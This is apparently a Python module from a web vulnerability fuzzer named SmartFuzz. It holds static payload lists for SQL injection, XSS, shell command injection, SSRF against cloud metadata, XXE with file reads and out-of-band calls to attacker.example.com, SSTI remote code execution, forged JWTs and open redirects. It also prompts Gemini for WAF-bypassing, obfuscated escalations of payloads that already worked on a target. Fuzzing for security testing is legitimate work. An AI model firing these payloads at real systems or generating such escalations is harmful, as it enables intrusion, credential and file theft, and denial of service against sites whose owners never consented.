"""
payload_generator.py — SmartFuzz AI Payload Generator (Prompt 14)
==================================================================
Added:
  - Auth Bypass static payloads (SQL auth bypass, default creds, JWT tricks)
  - IDOR static payloads (numeric ID manipulation markers)
  - Gemini prompts for both new vuln types
"""

import os
import json
import time
import urllib.parse
import requests
import logging
from dotenv import load_dotenv

load_dotenv()

logger = logging.getLogger("smartfuzz.payload_gen")

GEMINI_API_KEY = os.getenv("GEMINI_API_KEY", "")

# Default model: gemini-2.5-flash-lite — free tier, 15 RPM, 1000 RPD, fastest
# of the 2.5 family. Override via GEMINI_MODEL env var if you ever want a
# different free model (gemini-2.0-flash, gemini-1.5-flash-8b, …).
GEMINI_MODEL = os.getenv("GEMINI_MODEL", "gemini-2.5-flash-lite")
GEMINI_URL = (
    f"https://generativelanguage.googleapis.com/v1beta/models/"
    f"{GEMINI_MODEL}:generateContent"
)

# HTTP statuses worth a single retry — almost always transient under free tier.
_RETRY_STATUSES = {429, 500, 502, 503, 504}
_RETRY_BACKOFF_S = 3.0  # short enough not to stall the scan, long enough to
                        # clear a transient per-minute quota blip

# ── Static Fallback Payloads ──────────────────────────────────────────────────

STATIC_PAYLOADS = {
    "SQLi": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "1; DROP TABLE users--",
        "' UNION SELECT null, username, password FROM users--",
        "admin'--",
        "' OR 1=1--",
        "1' AND SLEEP(5)--",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "1 OR 1=1",
    ],
    "XSS": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "'><script>alert(document.cookie)</script>",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(`XSS`)'></iframe>",
        "';alert('XSS')//",
        "<input onfocus=alert('XSS') autofocus>",
        "<details open ontoggle=alert('XSS')>",
    ],
    "RCE": [
        "; ls -la",
        "| ls -la",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; id",
        "| id",
        "; whoami",
        "`id`",
        "$(id)",
        "; ping -c 4 127.0.0.1",
    ],
    "SSRF": [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1/admin",
        "http://localhost:8080",
        "http://0.0.0.0/",
        "http://[::1]/",
        "http://192.168.1.1",
        "http://169.254.169.254/latest/user-data/",
        "file:///etc/passwd",
        "dict://localhost:11211/",
        "gopher://127.0.0.1:9000/",
    ],
    "Command Injection": [
        "| whoami",
        "; whoami",
        "& whoami",
        "&& whoami",
        "| cat /etc/passwd",
        "; cat /etc/passwd",
        "| net user",
        "& net user",
        "`whoami`",
        "$(whoami)",
    ],

    # ── NEW: Auth Bypass ──────────────────────────────────────────────────────
    "Auth Bypass": [
        # SQL-based auth bypass
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR 1=1--",
        "admin'--",
        "' OR 'x'='x",
        "') OR ('1'='1",
        "' OR 1=1#",
        "1' OR '1'='1' /*",
        # Default / common credentials (username:password as payload string)
        "admin",
        "administrator",
        "admin123",
        "password",
        "123456",
        "root",
        "test",
        "guest",
        # JWT manipulation markers (fuzzer injects these into token fields)
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.invalid_sig",
    ],

    # ── NEW: IDOR ─────────────────────────────────────────────────────────────
    # These are marker strings; the real IDOR probing is done by the fuzzer's
    # dedicated _run_idor_checks() which extracts real IDs from URLs and
    # increments/decrements them. These markers allow the payload generator
    # path to still contribute something for field-level IDOR hints.
    "IDOR": [
        "1",
        "2",
        "0",
        "-1",
        "9999",
        "99999",
        "../1",
        "1%00",
        "1 OR 1=1",
        "null",
    ],

    # ── NEW: NoSQL Injection ──────────────────────────────────────────────────
    "NoSQL": [
        "'; return true; var x='",
        "'||1==1//",
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$where": "1==1"}',
        "'; return JSON.stringify(this); var x='",
        "' || '1'=='1",
        '{"$regex": ".*"}',
        "admin' || '1==1",
        "[$ne]=1",
    ],

    # ── NEW: XXE (XML External Entity) ────────────────────────────────────────
    "XXE": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.example.com">]><foo>&xxe;</foo>',
        # Billion-laughs DoS
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
        # External DTD
        '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.example.com/evil.dtd"><foo/>',
        # Parameter entity OOB
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.example.com/evil.dtd"> %xxe;]><foo/>',
        # PHP filter wrapper
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        # SVG with XXE
        '<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',
        # Without DOCTYPE
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
        # CDATA-wrapped
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><![CDATA[&xxe;]]></foo>',
    ],

    # ── NEW: SSTI (Server-Side Template Injection) ────────────────────────────
    "SSTI": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "${'a'.getClass()}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{% for x in ().__class__.__base__.__subclasses__() %}{{x}}{% endfor %}",
        "<%= system('id') %>",
    ],

    # ── NEW: Open Redirect ────────────────────────────────────────────────────
    "Open Redirect": [
        "https://evil.com",
        "//evil.com",
        "///evil.com",
        "\\\\evil.com",
        "http://google.com%2f%2eevil.com",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "/\\evil.com",
        "http://localhost@evil.com",
        "http://127.0.0.1.evil.com",
    ],
}

# ── Gemini prompt templates ────────────────────────────────────────────────────

_PROMPTS = {
    "Auth Bypass": """\
You are a web application penetration tester specialising in authentication vulnerabilities.

Generate {count} authentication bypass payloads for an input field named "{field_name}".
Page title: "{page_title}"
Form action: "{form_action}"

Focus on:
1. SQL injection-based authentication bypasses (e.g. OR 1=1, comment sequences)
2. Default and commonly-used credentials relevant to the field context
3. JWT algorithm confusion payloads (alg=none, weak secret guesses)
4. HTTP header injections that may bypass auth (X-Forwarded-For, X-Original-URL)
5. At least one WAF bypass variant

Return ONLY a JSON array of strings. No explanations, no markdown.
""",

    "IDOR": """\
You are a web application penetration tester specialising in IDOR vulnerabilities.

Generate {count} IDOR test payloads for an input field named "{field_name}".
Page title: "{page_title}"
Form action: "{form_action}"

Focus on:
1. Numeric ID manipulation (increment, decrement, boundary values like 0 and -1)
2. UUID/GUID guessing or substitution patterns
3. Base64-encoded ID manipulation
4. Parameter pollution (duplicate parameters with different IDs)
5. Type juggling (string "1" vs integer 1 vs "01")

Return ONLY a JSON array of strings. No explanations, no markdown.
""",

    "NoSQL": """\
You are a web application penetration tester specialising in NoSQL injection (MongoDB, CouchDB, Cassandra).

Generate {count} NoSQL injection payloads for an input field named "{field_name}".
Page title: "{page_title}"
Form action: "{form_action}"

Focus on:
1. MongoDB operator injection ($ne, $gt, $where, $regex) in JSON bodies
2. JavaScript evaluation via $where with always-true predicates
3. Array-style operator smuggling (e.g. param[$ne]=1) for form-encoded inputs
4. Boolean-based bypasses for login forms (e.g. {{"username": {{"$ne": null}}, "password": {{"$ne": null}}}})
5. At least one WAF bypass variant using whitespace, comments, or alternate operators

Return ONLY a JSON array of strings. No explanations, no markdown.
""",

    "XXE": """\
You are a web application penetration tester specialising in XML External Entity (XXE) injection.

Generate {count} XXE payloads suitable for an input field named "{field_name}" that accepts XML.
Page title: "{page_title}"
Form action: "{form_action}"

Focus on:
1. File-read XXE via SYSTEM entities (file:///etc/passwd, file:///c:/windows/win.ini)
2. Out-of-band (OOB) data exfiltration via http:// SYSTEM entities to attacker.example.com
3. Parameter entity OOB via external DTDs
4. Billion-laughs / quadratic blowup DoS variants
5. Wrapper-based reads (php://filter/convert.base64-encode/resource=...)
6. At least one WAF bypass using XInclude or DOCTYPE-less variants

Each payload MUST be a complete, well-formed XML document starting with <?xml ... ?>.
Return ONLY a JSON array of strings. No explanations, no markdown.
""",

    "SSTI": """\
You are a web application penetration tester specialising in Server-Side Template Injection (SSTI).

Generate {count} SSTI payloads for an input field named "{field_name}".
Page title: "{page_title}"
Form action: "{form_action}"

Focus on:
1. Engine-fingerprinting math probes ({{7*7}}, ${{7*7}}, <%= 7*7 %>, #{{7*7}}) across Jinja2, Twig, Freemarker, ERB, Liquid
2. Sandbox escapes using __class__ / __mro__ / __subclasses__ chains for Python/Jinja2
3. Java/Freemarker class loader escapes via .getClass()
4. Direct RCE attempts (os.popen, Runtime.exec, system())
5. At least 2 WAF bypass variants using whitespace, unicode escapes, or attribute-access syntax

Return ONLY a JSON array of strings. No explanations, no markdown.
""",

    "Open Redirect": """\
You are a web application penetration tester specialising in Open Redirect vulnerabilities.

Generate {count} payload URLs designed to redirect the victim to "evil.example.com" from an input
field named "{field_name}" (typically a `next`, `return`, `redirect`, `url`, or `continue` parameter).
Page title: "{page_title}"
Form action: "{form_action}"

Focus on:
1. Schemeless and protocol-relative URLs (//evil.example.com, ///evil.example.com)
2. Backslash and mixed-slash bypasses (\\\\evil.example.com, /\\evil.example.com)
3. URL-encoded path traversal that breaks naive prefix checks (http://trusted.com%2f%2eevil.example.com)
4. Userinfo-based confusion (http://trusted.com@evil.example.com)
5. Subdomain-confusion via DNS rebinding lookalikes (http://trusted.com.evil.example.com)
6. Non-http schemes (javascript:, data:) that some validators forget to block

Return ONLY a JSON array of strings. No explanations, no markdown.
""",

    # Default prompt for all other vuln types
    "_default": """\
You are a web application security expert and penetration tester.

Generate {count} {vuln_type} fuzzing payloads for an input field named "{field_name}".
Page title: "{page_title}"
Form action: "{form_action}"

Rules:
1. Make payloads specific to the field name and context.
2. Include basic and advanced payloads.
3. Include at least one WAF bypass technique.
4. Return ONLY a JSON array of strings. Nothing else.
""",
}


# ── Main Entry Points ─────────────────────────────────────────────────────────

def generate_payloads(
    vuln_type: str,
    field_name: str,
    page_title: str = "",
    form_action: str = "",
    count: int = 8,
) -> dict:
    if not GEMINI_API_KEY:
        logger.warning("[PayloadGen] No API key — using static fallback.")
        return _fallback(vuln_type, field_name)

    try:
        payloads = _call_gemini(vuln_type, field_name, page_title, form_action, count)
        if payloads:
            logger.info(
                f"[PayloadGen] Gemini returned {len(payloads)} payloads "
                f"for {vuln_type}/{field_name}"
            )
            return {
                "vuln_type":  vuln_type,
                "field_name": field_name,
                "source":     "gemini",
                "payloads":   payloads,
            }
    except Exception as e:
        logger.warning(f"[PayloadGen] Gemini call failed: {e} — using fallback.")

    return _fallback(vuln_type, field_name)


def generate_all_payloads(vuln_classes: list, crawl_data: dict) -> dict:
    page_title = crawl_data.get("page_title", "")
    all_fields = _extract_all_fields(crawl_data)
    results = {}

    for vuln_type in vuln_classes:
        results[vuln_type] = {}
        if not all_fields:
            gen = generate_payloads(vuln_type, "input", page_title)
            results[vuln_type]["input"] = gen["payloads"]
        else:
            for field in all_fields[:15]:
                gen = generate_payloads(
                    vuln_type=vuln_type,
                    field_name=field["name"],
                    page_title=page_title,
                    form_action=field.get("action", ""),
                )
                results[vuln_type][field["name"]] = gen["payloads"]

    return results


# ── Gemini API Call ───────────────────────────────────────────────────────────

def _gemini_post(body: dict, timeout: int = 20) -> requests.Response | None:
    """POST to Gemini with one automatic retry on transient failures (429/5xx).
    Returns the Response on the final attempt, or None on connection error."""
    url = f"{GEMINI_URL}?key={GEMINI_API_KEY}"
    last_resp: requests.Response | None = None
    for attempt in (1, 2):
        try:
            resp = requests.post(url, json=body, timeout=timeout)
        except requests.exceptions.RequestException as e:
            if attempt == 1:
                logger.warning(
                    f"[PayloadGen] Network error ({e}) — retrying in {_RETRY_BACKOFF_S}s"
                )
                time.sleep(_RETRY_BACKOFF_S)
                continue
            logger.error(f"[PayloadGen] Network error on retry: {e}")
            return None
        last_resp = resp
        if resp.status_code in _RETRY_STATUSES and attempt == 1:
            logger.warning(
                f"[PayloadGen] Gemini {resp.status_code} (transient) — "
                f"backing off {_RETRY_BACKOFF_S}s and retrying once"
            )
            time.sleep(_RETRY_BACKOFF_S)
            continue
        return resp
    return last_resp


def _parse_gemini_payloads(resp: requests.Response | None) -> list:
    """Extract a JSON array of payload strings from a Gemini response."""
    if resp is None:
        return []
    if resp.status_code != 200:
        logger.error(
            f"[PayloadGen] Gemini API error {resp.status_code}: "
            f"{resp.text[:200]}"
        )
        return []
    data = resp.json()
    text = (
        data.get("candidates", [{}])[0]
            .get("content", {})
            .get("parts", [{}])[0]
            .get("text", "")
            .strip()
    )
    if not text:
        return []
    try:
        payloads = json.loads(text)
        if isinstance(payloads, list):
            return [str(p) for p in payloads if p]
    except json.JSONDecodeError:
        clean = text.strip().lstrip("```json").lstrip("```").rstrip("```").strip()
        try:
            payloads = json.loads(clean)
            if isinstance(payloads, list):
                return [str(p) for p in payloads if p]
        except Exception:
            pass
    logger.warning("[PayloadGen] Could not parse Gemini JSON response.")
    return []


def _call_gemini(
    vuln_type: str,
    field_name: str,
    page_title: str,
    form_action: str,
    count: int,
) -> list:
    template = _PROMPTS.get(vuln_type, _PROMPTS["_default"])
    prompt = template.format(
        count=count,
        vuln_type=vuln_type,
        field_name=field_name,
        page_title=page_title or "Unknown",
        form_action=form_action or "Unknown",
    )
    body = {
        "contents": [{"parts": [{"text": prompt}]}],
        "generationConfig": {
            "temperature": 0.7,
            "maxOutputTokens": 2048,
            "responseMimeType": "application/json",
        },
    }
    return _parse_gemini_payloads(_gemini_post(body, timeout=20))


def _call_gemini_prompt(prompt: str) -> list:
    """Call Gemini with a fully-formed prompt string. Returns list of payload strings."""
    body = {
        "contents": [{"parts": [{"text": prompt}]}],
        "generationConfig": {
            "temperature": 0.8,
            "maxOutputTokens": 2048,
            "responseMimeType": "application/json",
        },
    }
    resp = _gemini_post(body, timeout=25)
    if resp is None:
        return []
    if resp.status_code != 200:
        return []
    data = resp.json()
    text = (
        data.get("candidates", [{}])[0]
            .get("content", {})
            .get("parts", [{}])[0]
            .get("text", "")
            .strip()
    )
    if not text:
        return []
    try:
        payloads = json.loads(text)
        if isinstance(payloads, list):
            return [str(p) for p in payloads if p]
    except json.JSONDecodeError:
        clean = text.strip().lstrip("```json").lstrip("```").rstrip("```").strip()
        try:
            payloads = json.loads(clean)
            if isinstance(payloads, list):
                return [str(p) for p in payloads if p]
        except Exception:
            pass
    return []


_REFINE_SEV_RANK = {"Critical": 4, "High": 3, "Medium": 2, "Low": 1}


def _mutate_payload(payload: str, vuln_type: str) -> list[str]:
    """Deterministic mutation set applied to a confirmed payload. Used to
    generate second-pass variants when Gemini is unavailable (429/quota)."""
    if not payload:
        return []
    variants: set[str] = set()

    # Universal encoding tricks
    variants.add(urllib.parse.quote(payload, safe=""))
    variants.add(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))

    # Case mutations (only if the payload contains letters)
    if any(c.isalpha() for c in payload):
        variants.add(payload.swapcase())
        variants.add("".join(c.upper() if i % 2 else c.lower()
                             for i, c in enumerate(payload)))

    # SQL-family — comment suffixes, whitespace tricks, alt quote encoding
    if vuln_type in ("SQLi", "NoSQL", "Auth Bypass"):
        variants.add(payload + "--")
        variants.add(payload + "#")
        variants.add(payload + "/*")
        variants.add(payload.replace(" ", "/**/"))
        variants.add(payload.replace(" ", "\t"))
        variants.add(payload.replace("'", "%27"))
        variants.add(payload.replace("=", " LIKE "))

    # XSS — tag double-bracket, script case-mix, alternative event handlers
    if vuln_type == "XSS":
        variants.add(payload.replace("<", "<<"))
        variants.add(payload.replace("script", "scRipt"))
        variants.add(payload.replace("alert", "prompt"))
        variants.add(payload.replace("onerror", "OnErRoR"))
        variants.add(payload.replace("<", "%3C").replace(">", "%3E"))

    # RCE / CMDi — swap shell separators
    if vuln_type in ("RCE", "Command Injection"):
        for src, dsts in [(";", ["|", "&", "&&", "||"]),
                          ("|", [";", "&"]),
                          ("&", [";", "|"])]:
            if payload.startswith(src):
                for d in dsts:
                    variants.add(d + payload[len(src):])

    # SSRF — IP encoding tricks
    if vuln_type == "SSRF" and "127.0.0.1" in payload:
        variants.add(payload.replace("127.0.0.1", "127.1"))           # short form
        variants.add(payload.replace("127.0.0.1", "0x7f.0.0.1"))      # hex octet
        variants.add(payload.replace("127.0.0.1", "2130706433"))      # decimal
        variants.add(payload.replace("127.0.0.1", "[::1]"))           # IPv6 loopback

    # Open Redirect — extra encoding of slashes
    if vuln_type == "Open Redirect":
        variants.add(payload.replace("/", "%2f"))
        variants.add(payload.replace(":", "%3a"))

    # Strip the original and empty strings
    variants.discard(payload)
    variants.discard("")
    return list(variants)


def _static_refine(
    initial_findings: list[dict],
    vuln_classes: list[str],
) -> dict:
    """Mutation-based second pass. Same return shape as the Gemini path —
    used as a fallback when Gemini is unavailable so the adaptive loop still
    runs and produces visible progress."""
    by_type: dict[str, list[dict]] = {}
    for f in initial_findings:
        vt = f.get("vuln_type", "")
        if vt and vt in vuln_classes:
            by_type.setdefault(vt, []).append(f)

    results: dict = {}
    for vuln_type, findings in by_type.items():
        top = sorted(
            findings,
            key=lambda f: _REFINE_SEV_RANK.get(f.get("severity", "Low"), 0),
            reverse=True,
        )[:3]
        params = list({f.get("parameter", "input") for f in top})
        if not params:
            continue
        variants: list[str] = []
        for f in top:
            variants.extend(_mutate_payload(f.get("payload", ""), vuln_type))
        # Dedupe (preserve order) and cap so we don't explode the request count
        seen = set()
        unique: list[str] = []
        for v in variants:
            if v not in seen:
                seen.add(v)
                unique.append(v)
            if len(unique) >= 10:
                break
        if unique:
            results[vuln_type] = {p: unique for p in params}
    if results:
        total = sum(len(p) for fields in results.values() for p in fields.values())
        logger.info(
            f"[Refinement] Static fallback produced {total} mutation variant(s) "
            f"across {len(results)} class(es)"
        )
    return results


def refine_payloads(
    initial_findings: list[dict],
    crawl_data: dict,
    vuln_classes: list[str],
) -> dict:
    """
    Second-pass refinement. Tries Gemini first; falls back to deterministic
    payload mutation when Gemini is unavailable. Returns same shape as
    generate_all_payloads(). Returns {} only when there's literally nothing
    to refine (no findings, or no findings in the requested vuln classes).
    """
    if not initial_findings:
        return {}

    by_type: dict[str, list[dict]] = {}
    for f in initial_findings:
        vt = f.get("vuln_type", "")
        if vt and vt in vuln_classes:
            by_type.setdefault(vt, []).append(f)

    if not by_type:
        return {}

    # ── Gemini path ──────────────────────────────────────────────────────────
    results: dict = {}
    gemini_classes_succeeded = 0

    if GEMINI_API_KEY:
        for vuln_type, findings in by_type.items():
            top = sorted(
                findings,
                key=lambda f: _REFINE_SEV_RANK.get(f.get("severity", "Low"), 0),
                reverse=True,
            )[:3]
            params = list({f.get("parameter", "input") for f in top})
            worked_examples = "\n".join(
                f"  - param='{f.get('parameter')}' payload={repr(f.get('payload', ''))} "
                f"evidence={repr((f.get('evidence') or f.get('response_snippet', ''))[:200])}"
                for f in top
            )
            prompt = f"""\
You are an expert web penetration tester doing a second-pass attack refinement.

The following {vuln_type} payloads already triggered confirmed findings on this target:

{worked_examples}

Page title: "{crawl_data.get('page_title', 'Unknown')}"
Target parameters: {', '.join(params)}

Generate 10 MORE SOPHISTICATED {vuln_type} payloads that:
1. Are direct escalations or variants of the payloads that worked above
2. Attempt to bypass WAF filters, input sanitisation, and length limits
3. Try to extract more data or achieve deeper exploitation
4. Include at least 2 encoding or obfuscation variants (URL-encode, hex, unicode, etc.)
5. Are specific to the parameter names and context shown

Return ONLY a JSON array of strings. No explanations, no markdown fences.
"""
            try:
                refined = _call_gemini_prompt(prompt)
                if refined:
                    results[vuln_type] = {param: refined for param in params}
                    gemini_classes_succeeded += 1
                    logger.info(
                        f"[Refinement] Gemini provided {len(refined)} payloads for {vuln_type}"
                    )
            except Exception as e:
                logger.warning(f"[Refinement] Gemini call failed for {vuln_type}: {e}")

    # ── Static mutation fallback ─────────────────────────────────────────────
    # For every class Gemini couldn't refine (quota, network, parse error), fall
    # back to deterministic payload mutation so the adaptive loop visibly runs.
    missing_classes = [vt for vt in by_type if vt not in results]
    if missing_classes:
        if not GEMINI_API_KEY:
            logger.info("[Refinement] No API key — using static mutation for second pass")
        elif gemini_classes_succeeded == 0:
            logger.warning(
                "[Refinement] Gemini unavailable (rate-limited?) — "
                "falling back to static mutation for second pass"
            )
        else:
            logger.info(
                f"[Refinement] Gemini covered {gemini_classes_succeeded} class(es); "
                f"static fallback covering remaining {len(missing_classes)}"
            )
        static_results = _static_refine(initial_findings, missing_classes)
        results.update(static_results)

    return results


# ── Fallback & Helpers ────────────────────────────────────────────────────────

def _fallback(vuln_type: str, field_name: str) -> dict:
    payloads = STATIC_PAYLOADS.get(vuln_type, STATIC_PAYLOADS["SQLi"])
    return {
        "vuln_type":  vuln_type,
        "field_name": field_name,
        "source":     "static",
        "payloads":   payloads,
    }


def _extract_all_fields(crawl_data: dict) -> list:
    """Extract all unique named fields from forms + GET params."""
    fields = []
    seen = set()

    for form in crawl_data.get("forms", []):
        action = form.get("action", "")
        for field in form.get("fields", []):
            name = field.get("name")
            if name and name not in seen:
                seen.add(name)
                fields.append({"name": name, "action": action})

    for param_set in crawl_data.get("get_params", []):
        for name in param_set.get("params", {}).keys():
            if name not in seen:
                seen.add(name)
                fields.append({"name": name, "action": param_set.get("url", "")})

    return fields